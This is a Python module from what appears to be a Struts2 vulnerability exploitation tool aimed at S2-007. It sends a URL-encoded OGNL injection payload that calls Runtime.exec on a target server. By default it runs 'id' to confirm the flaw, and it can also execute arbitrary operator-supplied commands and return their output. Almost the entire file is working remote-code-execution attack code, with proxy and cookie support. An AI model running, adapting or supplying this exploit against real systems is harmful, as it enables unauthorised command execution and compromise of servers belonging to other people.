import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import random
import hashlib
import urllib

cdd=''
http = ''
https = ''
cmd=''
dq1=''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd,dq1
    global http, https,cmd
    try:
        proxies = {'http': http,
                   'https': https}
        if cmd!='':
            headers = {
                'Content-Type': "application/x-www-form-urlencoded"}
            logging.captureWarnings(True)
            poc2= "%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27MDC%27%29.getInputStream%28%29%29%29+%2B+%27"
            poc1=poc2.replace('MDC',cmd)
            data = dq1.format(exp=poc1)
            aa = requests.post(url1, data=data, headers=headers, proxies=proxies, verify=False, timeout=15,
                               cookies=s_cookie)
            cdd= aa.text
            cmd=''
        else:
            headers = {
                'Content-Type': "application/x-www-form-urlencoded"}
            logging.captureWarnings(True)
            poc= "%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29+%2B+%27"
            data=dq1.format(exp=poc)
            aa = requests.post(url1, data=data, headers=headers, proxies=proxies, verify=False, timeout=15,
                               cookies=s_cookie)
            if 'groups=0' in aa.text:
                cdd = '[+]漏洞存在\n执行命令：id\n匹配关键词：groups=0' + aa.text
            else:
                cdd = '[-]漏洞不存在\nPs：可更换 \POC\自定义.txt 中的0￥后的参数值再次尝试，格式禁止更改。'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ S2-007 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
def cmad(cmd1):
    global cmd
    cmd=cmd1
def cmd12():
    global dq1
    import os
    cg=open(os.getcwd()+'\POC\自定义.txt','r',encoding='utf-8')
    while True:
        ca=cg.readline()
        if len(ca)==0:
            break
        elif '0￥' in ca:
            dq1=ca.replace('\n','').replace('0￥','')